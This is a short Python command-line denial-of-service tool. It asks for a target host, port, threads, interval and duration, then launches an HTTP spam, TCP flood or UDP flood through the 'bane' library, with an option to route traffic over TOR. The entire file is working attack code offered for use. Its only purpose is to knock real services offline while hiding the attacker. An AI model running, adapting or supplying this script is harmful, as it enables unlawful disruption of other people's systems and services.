import bane, sys,socket
if  sys.version_info < (3,0):
    input=raw_input

while True:
 try:
  target=input('[*]Target Domain/IP : ')
  socket.gethostbyname(target)
  if target.strip()!="":
   break
 except KeyboardInterrupt:
   sys.exit()
 except:
  print('[-] Invalid Domain/IP')
print('\n\n')

while True:
 try:
  port=int(input('[*]Port : '))
  if port in list(range(1,65565)):
   break
  else:
   print('[-] Invalid port number')
 except KeyboardInterrupt:
   sys.exit()
 except:
  print('[-] Invalid number')
print('\n\n')

while True:
 try:
  threads=int(input('[*]Threads : '))
  break
 except KeyboardInterrupt:
   sys.exit()
 except:
  print('[-] Invalid number')
print('\n\n')

while True:
 try:
  interval=float(input('[*]Interval between packets : '))
  break
 except KeyboardInterrupt:
   sys.exit()
 except:
  print('[-] Invalid number')
print('\n\n')

while True:
 try:
  duration=int(input('[*]Duration of the attack : '))
  break
 except KeyboardInterrupt:
   sys.exit()
 except:
  print('[-] Invalid number')
print('\n\n')

while True:
 try:
  method=int(input('[*]DDoD method :\n    1-HTTP\n    2-TPC\n    3-UDP\n'))
  if method in [1,2,3]:
   break
  else:
   print('[-] Invalid choice')
 except KeyboardInterrupt:
   sys.exit()
 except:
  print('[-] Invalid number')
print('\n\n')

if method in [1,2]:
 while True:
  try:
   tor=int(input('[*]Use TOR?\n    1-Yes\n    2-No\n'))
   if tor in [1,2]:
    if tor==1:
     set_tor=True
    if tor==2:
     set_tor=False
    break
   else:
    print('[-] Invalid choice')
  except KeyboardInterrupt:
   sys.exit()
  except:
   print('[-] Invalid number')
 print('\n\n')

 if method==1:
  attack_instance=bane.http_spam(target,p=port,threads=threads,duration=duration,tor=set_tor,interval=interval,logs=True)
 else:
  attack_instance=bane.tcp_flood(target,p=port,threads=threads,duration=duration,tor=set_tor,min_size=500,max_size=1000,interval=interval,logs=True)
else:
 attack_instance=bane.udp_flood(target,p=port,threads=threads,duration=duration,min_size=500,max_size=1000,interval=interval,logs=True)
bane.process_threaded(attack_instance)